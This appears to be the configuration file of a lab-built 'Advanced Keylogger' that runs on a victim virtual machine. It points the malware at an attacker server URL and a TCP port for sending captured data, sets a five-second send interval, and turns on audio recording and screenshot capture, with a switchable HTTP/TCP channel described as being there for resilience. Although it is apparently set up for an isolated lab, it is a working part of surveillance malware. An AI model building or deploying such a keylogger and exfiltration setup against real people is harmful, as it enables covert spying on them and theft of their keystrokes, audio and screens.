# Configuration File for the Advanced Keylogger (Victim VM)

# --- RECEPTION SERVER CONFIGURATION ---
# IP address of the attacker machine. Use the actual IP of the Attacker VM.
# NOTE: In VirtualBox Internal Network mode, the IP will NOT be 127.0.0.1.
# Replace 127.0.0.1 with the actual address of the Attacker VM (e.g., "http://192.168.56.101:5000/log")
SERVER_URL = "http://127.0.0.1:5000/log"

# Port for TCP Socket communication (if TCP mode is activated)
TCP_PORT = 5001

# Frequency (in seconds) for sending the logs to the server
SEND_INTERVAL = 5


# --- CAPTURE CONFIGURATION ---

# 1. Audio Configuration
# Duration of each recorded audio clip before the event is saved (in seconds)
AUDIO_RECORD_SECONDS = 5
# Standard sampling rate (Hz)
AUDIO_RATE = 44100

# 2. Screenshot Configuration
# Interval between screen captures (in seconds). Be mindful of data volume!
SCREENSHOT_INTERVAL = 15


# --- COMMUNICATION MODE CONFIGURATION ---
# Active communication mode on startup. Used for resilience and potential switch_mode commands.
# Possible values: "http" or "tcp"
INITIAL_COMM_MODE = "http"